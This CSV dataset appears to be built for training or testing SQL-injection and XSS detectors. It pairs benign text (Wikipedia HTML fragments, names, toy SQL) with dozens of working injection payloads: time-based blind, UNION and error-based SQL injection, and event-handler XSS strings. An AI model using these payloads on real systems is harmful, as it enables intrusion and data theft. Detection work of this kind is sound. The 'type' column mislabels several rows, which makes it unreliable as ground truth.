Text,Label,type
"1,  (  select   (  case when   (  8640  =  8640  )   then   (  ascii  (  regexp_substring  (  repeat  (  right  (  char  (  8640  )  ,0  )  ,500000000  )  ,null   )    )     )   else 8640/  (  select 0 from information_schema.system_users  )   end  )   from information_schema.system_users  )  --",1,sql
"<dialog onmouseout=""alert(1)"">test</dialog>",2,xss
"-7868""   )    )    or 9323  =  9323#",1,xss
"1""   )    )    or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1,sql
"<tr onmouseover=""alert(1)"">test</tr>",2,xss
SELECT frequently FROM may,0,sql
"<style>:target {color:red;}</style><listing id=x style=""transition:color 1s"" ontransitionend=alert(1)></listing>",2,xss
SELECT TOP 50 PERCENT * FROM month SELECT * FROM which FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM definition,0,sql
"<video onmousedown=""alert(1)"">test</video>",2,xss
"   SELECT lungs, voice, broadFROM produce WHERE chamber  IS NOT NULL",0,sql
"   SELECT Employees.house, COUNT ( Orders.roofID )  AS breakFROM    ( OrdersINNER JOIN bowl ON Orders.careID  =  Employees.uponID ) ",0,sql
<aside id=x tabindex=1 onfocus=alert(1)></aside>,2,xss
10858,0,xss
SELECT come FROM realize UNION SELECT instrument FROM fly ORDER BY sell,0,sql
"1'  )   where 7007  =  7007 or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",1,xss
"1"" and make_set  (  8403  =  8403,8899  )   and ""bbgg""  =  ""bbgg",1,sql
1  )   rlike sleep  (  5  )  #,1,sql
1'  )   where 7903  =  7903,1,sql
en8og1da,0,sql
SELECT TOP 3 * FROM wave SELECT * FROM tribe 3SELECT * FROM football,0,sql
SELECT * FROM clay WHERE usual IN  ( SELECT circle FROM various ) ,0,sql
maurijn,0,sql
"<s onmousemove=""alert(1)"">test</s>",2,xss
harlin,0,sql
SELECT * FROM done FETCH FIRST 50 PERCENT ROWS ONLY,0,xss
"SELECT * FROM useful WHERE took BETWEEN ""egg"" AND    ""likely""",0,sql
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><dl id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></dl>",2,xss
"<var onpaste=""alert(1)"" contenteditable>test</var>",2,xss
SELECT option_value FROM wp_options WHERE option_name  =  '_options_footer_button_2_text' LIMIT 1,0,sql
"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/>. McCarthy recently reiterated his position at the <a href=""/wiki/AI@50"" title=""AI@50"">AI@50 </a> conference where he said ""Artificial intelligence is not, by definition, simulation of human intelligence"" (<a href=""#CITEREFMaker2006"">Maker 2006 </a>). </li> </ul>",0,xss
"<wbr draggable=""true"" ondragstart=""alert(1)"">test</wbr>",2,xss
"<tt onbeforecopy=""alert(1)"" contenteditable>test</tt>",2,xss
"<ul><li><a href=""#CITEREFRussellNorvig2003"">Russell &amp; Norvig 2003 </a>, pp.&#160;958–960 </li>",0,xss
SELECT sure FROM silent UNION SELECT sides FROM excellent ORDER BY wing,0,sql
SELECT * FROM brain FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM shadow,0,sql
salicilato,0,sql
" select * from users where id  =  1 or @#""{  =  1 union select 1,version  (    )   -- 1",1,sql
"<del onmouseout=""alert(1)"">test</del>",2,xss
"consolacion 92, 12?h",0,sql
konstanc,0,sql
4.79764E+15,0,sql
"<link onkeydown=""alert(1)"" contenteditable>test</link>",2,xss
1' where 3701  =  3701 and 2006  =  2006,1,xss
SELECT * FROM worry WHERE engine BETWEEN 'struggle' AND 'activity',0,sql
1'  )   where 6624  =  6624 and 5392  =  8258,1,sql
"-9150%'   )    )     )   union all select 7057,7057,7057,7057,7057,7057,7057,7057--",1,sql
"1'  )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   ",1,xss
"	 </span>. <a href=""/wiki/Digital_object_identifier"" title=""Digital object identifier"">doi </a>:<a rel=""nofollow"" class=""external text"" href=""https://doi.org/10.1016%2FS0921-8890%2805%2980025-9"">10.1016/S0921-8890(05)80025-9 </a>. <a rel=""nofollow"" class=""external text"" href=""https://web.archive.org/web/20070809020912/http://people.csail.mit.edu/brooks/papers/elephants.pdf"">Archived </a> <span class=""cs1-format"">(PDF) ",0,xss
"-9977"" where 5132  =  5132 union all select 5132--",1,sql
SELECT * FROM must ORDER BY blood,0,sql
SELECT street ( s )  FROM pupil SELECT concerned ( s ) ,0,sql
"1'||  (  select 'xbvz' from dual where 1632  =  1632 union all select null,null,null,null,null,null,null,null--",1,sql
9869,0,sql
43391,0,xss
"<nav draggable=""true"" ondragleave=""alert(1)"">test</nav>",2,xss
hermida fiordalizzi,0,xss
"-7971   )    )    as armw where 9474  =  9474 or make_set  (  9354  =  9354,7185  )  --",1,sql
"	 </span> <span class=""reference-text"">",0,xss
40984940k,0,xss
"<p class=""caption""><span class=""caption-text"">All the rest",0,xss
jocs olimpics 110 1-b,0,xss
11539856c,0,sql
"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/>. </li>",0,xss
1'+  (  select xwcl where 7997  =  7997,1,sql
SELECT * FROM pull FETCH FIRST 50 PERCENT ROWS ONLY,0,sql
reski.kuberskaya@n340magazin.no,0,sql
"1"" and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",1,sql
"<code draggable=""true"" ondragenter=""alert(1)"">test</code>",2,xss
"		<li id=""pt-anonuserpage"">Not logged in </li>",0,xss
"INSERT INTO death ( guide, hit, without, pleasure, table, found )  VALUES  ( 'move', 'bite'. tree', 'brass', 'led', 'corner', 'substance' )  ",0,sql
SELECT * FROM down 3,0,xss
SELECT * FROM right FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM grow,0,xss
"1%"" or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",1,sql
"<main onbeforecut=""alert(1)"" contenteditable>test</main>",2,xss
"1'+  (  select kpso where 1226  =  1226 union all select null,null,null,null,null,null,null,null--",1,sql
SELECT AVG ( aid ) FROM corner,0,sql
"-5928""   )    )    or elt  (  1032  =  1032,3623  )   and    (    (   ""rggt"" like ""rggt",1,sql
"1""  )   as zovk where 4591  =  4591 or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",1,sql
SELECT * FROM fell WHERE potatoes LIKE '%screen%',0,sql
1'   )    )    as hpta where 5376  =  5376 waitfor delay '0:0:5'--,1,sql
"1   )    )    as berd where 5803  =  5803 union all select null,null,null,null,null,null,null--",1,sql
"<li id=""cite_note-228""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-228"">^ </a> </b> ",0,xss
"1""   )    )    as uycc where 4364  =  4364 and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1,sql
"<li><a href=""/wiki/Real-time_computing"" title=""Real-time computing"">Real-time computing </a> </li>",0,xss
-2241  )   where 7606  =  7606 or   (  8459  =  8459  )  *4906--,1,sql
"  SELECT contrastID AS ID, silent AS fierce FROM heard",0,sql
"<li><a href=""/wiki/Substance_dualism"" class=""mw-redirect"" title=""Substance dualism"">Substance dualism </a> </li> </ul>",0,xss
document.documentElement.nodeName,2,xss
"<li id=""cite_note-autogenerated2-398""><span class=""mw-cite-backlink"">^ <a href=""#cite_ref-autogenerated2_398-0""><sup><i><b>a </b> </i> </sup> </a> <a href=""#cite_ref-autogenerated2_398-1""><sup><i><b>b </b> </i> </sup> </a> ",0,xss
<isindex onblur=alert(1) tabindex=1 id=x></isindex><input autofocus>,2,xss
"iif  (  9229  =  4158,1,1/0  )  ",1,sql
"<col onmouseout=""alert(1)"">test</col>",2,xss
"<data onkeyup=""alert(1)"" contenteditable>test</data>",2,xss
"1'  )   or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  ",1,sql
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 8774 )  ORDER BY meta_id ASC",0,sql
"   SELECT COUNT ( printed ) , zoo FROM struggle BY dish",0,sql
 </li>,0,xss
espls,0,sql
SELECT * FROM molecular WHERE porch NOT LIKE 'local%',0,sql
SELECT forgotten ( s )  FROM better FULL OUTER JOIN,0,sql
"1'   )    )     )   and elt  (  4249  =  4249,7259  )   and    (    (     (  'kgdt' like 'kgdt",1,sql
"<li><a href=""#CITEREFPooleMackworthGoebel1998"">Poole, Mackworth &amp; Goebel 1998 </a>, pp.&#160;248–256, 323–335, </li>",0,xss
1%'   )    )    and sleep  (  5  )  #,1,sql
crosby,0,xss
<nobr id=x tabindex=1 onfocus=alert(1)></nobr>,2,xss
"<acronym oncontextmenu=""alert(1)"">test</acronym>",2,xss
"document.querySelector("""")",2,xss
"<style>@keyframes x{}</style><listing style=""animation-name:x"" onanimationstart=""alert(1)""></listing>",2,xss
"   SELECT COUNT ( immediately ) , policeman FROM length BY seldom",0,sql
4a6050,0,sql
1'||  (  select 'allj' where 7334  =  7334,1,sql
"1   )    )    as xebl where 3105  =  3105 or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1,xss
SELECT * FROM vertical WHERE round BETWEEN '1996-07-01' AND '1996-07-31',0,xss
SELECT TOP 50 PERCENT * FROM win SELECT * FROM stranger FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM stiff,0,sql
mota del cuervo,0,sql
50,0,sql
"<li><a href=""/wiki/Dominicus_Gundissalinus"" title=""Dominicus Gundissalinus"">Dominicus Gundissalinus </a> </li>",0,xss
SELECT * FROM quarter WHERE although = 'grow',0,xss
"  UPDATE very SET anywhere =  'pressure', City =  'couple' WHERE pay =  but",0,sql
SELECT AVG ( there ) FROM bone SELECT SUM ( affect ) ,0,xss
"<bdi onkeypress=""alert(1)"" contenteditable>test</bdi>",2,xss
"<font draggable=""true"" ondragend=""alert(1)"">test</font>",2,xss
" SELECT column_name ( s )  FROM gray,separate",0,xss
SELECT * FROM dozen  WHERE screen NOT LIKE '[combination]%',0,sql
SELECT private ( s )  FROM nor UNION,0,sql
	 </span> </h4>,0,xss
"  SELECT automobile,large FROM sleep WHERE extra = 'biggest' UNION SELECT sheet, had FROM rabbit",0,sql
"1'||  (  select 'ctgs' where 6809  =  6809 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1,sql
des7768ab9e6os,0,sql
"<summary onkeyup=""alert(1)"" contenteditable>test</summary>",2,xss
SELECT * FROM birds  WHERE sum = substance,0,sql
31588,0,sql
57186589x,0,sql
 </p>,0,xss
"<optgroup draggable=""true"" ondragstart=""alert(1)"">test</optgroup>",2,xss
SELECT * FROM inside  WHERE fear NOT LIKE '[zulu]%',0,sql
"1' or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and 'ugum' like 'ugum",1,sql
"1   )    )    as jrzr where 5194  =  5194 and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1,sql
"1""   )    )    as tngu where 3644  =  3644 union all select null--",1,sql
8230,0,sql
select sleep  (  5  )   and   (  'pwpc'  =  'pwpc,1,sql
SELECT * FROM wooden WHERE grandmother NOT LIKE 'tonight%',0,xss
SELECT option_value FROM wp_options WHERE option_name  =  'kc_tkl_cc' LIMIT 1,0,sql
"1'  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  'kejy'  =  'kejy",1,sql
vallado oliveras,0,sql
" </p><p>Moreover, the application of <a href=""/wiki/Personality_computing"" title=""Personality computing"">Personality computing </a> AI models can help reducing the cost of advertising campaigns by adding psychological targeting to more traditional sociodemographic or behavioral targeting.<sup id=""cite_ref-Celli_et_al._2017_342-0"" class=""reference""><a href=""#cite_note-Celli_et_al._2017-342"">&#91;331&#93; </a> </sup>",0,xss
"   SELECT skill, from, thumb FROM street WHERE poetry  IS NULL",0,sql
"	 </span> <span class=""reference-text"">",0,xss
"1'  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  'iifh'  =  'iifh",1,sql
montoro,0,sql
"diamante, 114,",0,sql
SELECT * FROM escape WHERE everybody = 'action' LIMIT 3,0,sql
55950989q,0,sql
petree,0,sql
"<li><a href=""/wiki/Network_protocol"" class=""mw-redirect"" title=""Network protocol"">Network protocol </a> </li>",0,xss
"<main onmouseover=""alert(1)"">test</main>",2,xss
SELECT column_name ( s )  FROM table2; SELECT column_name ( s ) ,0,xss
SELECT TOP 3 * FROM tape WHERE earlier = 'told' SELECT * FROM behind,0,sql
SELECT * FROM large 3 SELECT * FROM stone,0,xss
"1',  (  select * from generate_series  (  5609,5609,case when   (  5609  =  5609  )   then 1 else 0 end  )   limit 1  )  ",1,sql
30599008s,0,sql
arima@hormigon-impreso.nu,0,sql
"<dialog ondblclick=""alert(1)"">test</dialog>",2,xss
"1'+  (  select inrv where 2178  =  2178 or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1,sql
SELECT * FROM give WHERE slabs = 'property' LIMIT 3,0,xss
"			<img alt="""" src=""//upload.wikimedia.org/wikipedia/commons/thumb/b/b8/Kismet_robot_at_MIT_Museum.jpg/220px-Kismet_robot_at_MIT_Museum.jpg"" decoding=""async"" width=""220"" height=""165"" class=""thumbimage"" srcset=""//upload.wikimedia.org/wikipedia/commons/thumb/b/b8/Kismet_robot_at_MIT_Museum.jpg/330px-Kismet_robot_at_MIT_Museum.jpg 1.5x, //upload.wikimedia.org/wikipedia/commons/thumb/b/b8/Kismet_robot_at_MIT_Museum.jpg/440px-Kismet_robot_at_MIT_Museum.jpg 2x"" data-file-width=""2272"" data-file-height=""1704"" /> </a>  ",0,xss
"<ul><li><a href=""#CITEREFRussellNorvig2003"">Russell &amp; Norvig 2003 </a>, pp.&#160;492–523, </li>",0,xss
"	<sup id=""cite_ref-139"" class=""reference""><a href=""#cite_note-139"">&#91;136&#93; </a> </sup>",0,xss
lafayette@vitalhome.hk,0,xss
"<style>:target {color:red;}</style><param id=x style=""transition:color 1s"" ontransitionend=alert(1)></param>",2,xss
"INSERT INTO population ( missing, therefore, particularly, other, herself, yes )  VALUES  ( 'product', 'shop'. time', 'active', 'active', 'open', 'before' )  ",0,xss
"<li><a href=""#CITEREFLugerStubblefield2004"">Luger &amp; Stubblefield 2004 </a> </li>",0,xss
select   (  case when   (  2830  =  7046  )   then 2830 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,1,xss
SELECT * FROM language WHERE yourself = 'goose'  OR smoke = 'being',0,xss
   )    )    or sleep  (  __TIME__  )    =  ',1,sql
"<strong onkeypress=""alert(1)"" contenteditable>test</strong>",2,xss
"1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   ",1,sql
<template onpointerdown=alert(1)>XSS</template>,2,xss
santo,0,sql
boagne,0,sql
SELECT scared ( s )  FROM power,0,xss
SELECT * FROM sale WHERE shirt BETWEEN '1996-07-01' AND '1996-07-31',0,sql
SELECT sentence ( s FROM top RIGHT JOIN,0,sql
"1""  )   or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1,sql
"1   )    )    union all select null,null,null,null,null--",1,sql
"<title draggable=""true"" ondrag=""alert(1)"">test</title>",2,xss
pblica,0,sql
"-2787' union all select 3622,3622,3622,3622,3622,3622,3622,3622,3622,3622#",1,sql
SELECT * FROM surrounded WHERE send = 'brush' FETCH FIRST 3 ROWS ONLY,0,sql
SELECT * FROM either WHERE shinning = 'up'  OR ear = 'metal',0,sql
SELECT * FROM additional WHERE thou = 'not',0,sql
"-2204'||  (  select 'bwae' from dual where 4884  =  4884 union all select 4884,4884,4884,4884,4884,4884,4884,4884,4884,4884#",1,sql
SELECT * FROM imagine ORDER BY practice,0,sql
" end and    (    (     (  ""memh"" like ""memh",1,sql
"  (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and    (    (     (  ""%""  =  """,1,xss
	 </span> </a> </li>,0,xss
SELECT AVG ( pony ) FROM lips SELECT SUM ( older ) ,0,sql
SELECT TOP 50 PERCENT * FROM trap SELECT * FROM toy FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM tube,0,sql
"1'||  (  select 'ersu' where 4123  =  4123 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",1,xss
"<ul><li><a href=""#CITEREFMcCorduck2004"">McCorduck 2004 </a>, pp.&#160;266–276, 298–300, 314, 421 </li>",0,xss
"	 </span><a href=""/w/index.php?title=Artificial_intelligence&amp;action=edit&amp;section=58"" title=""Edit section: Machine ethics"">edit </a><span class=""mw-editsection-bracket"">] ",0,xss
"	<div class=""portal"" role=""navigation"" id=""p-interaction""  aria-labelledby=""p-interaction-label"">",0,xss
SELECT DISTINCT claws FROM gentle,0,sql
"	 </span> <span class=""reference-text""><cite class=""citation book"">Daniel Merkle; Martin Middendorf (2013). ""Swarm Intelligence"".  In Burke, Edmund K.; Kendall, Graham (eds.). <i>Search Methodologies: Introductory Tutorials in Optimization and Decision Support Techniques </i>. Springer Science &amp; Business Media. <a href=""/wiki/International_Standard_Book_Number"" title=""International Standard Book Number"">ISBN </a>&#160;<a href=""/wiki/Special:BookSources/978-1-4614-6940-7"" title=""Special:BookSources/978-1-4614-6940-7""><bdi>978-1-4614-6940-7 </bdi> </a>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Abook&amp;rft.genre=bookitem&amp;rft.atitle=Swarm+Intelligence&amp;rft.btitle=Search+Methodologies%3A+Introductory+Tutorials+in+Optimization+and+Decision+Support+Techniques&amp;rft.pub=Springer+Science+%26+Business+Media&amp;rft.date=2013&amp;rft.isbn=978-1-4614-6940-7&amp;rft.au=Daniel+Merkle&amp;rft.au=Martin+Middendorf&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,xss
"<dt onmouseenter=""alert(1)"">test</dt>",2,xss
"<h1 onmousedown=""alert(1)"">test</h1>",2,xss
"SELECT STRCMP ( ""SQL Tutorial"",   ""SQL Tutorial"" ) ;",0,sql
SELECT * FROM engine WHERE write = 'mouth',0,xss
	 </span>,0,xss
"	 </span><span class=""mw-editsection""><span class=""mw-editsection-bracket"">[ ",0,xss
"1,  (  case when 5514  =  9602 then 1 else null end  )  ",1,sql
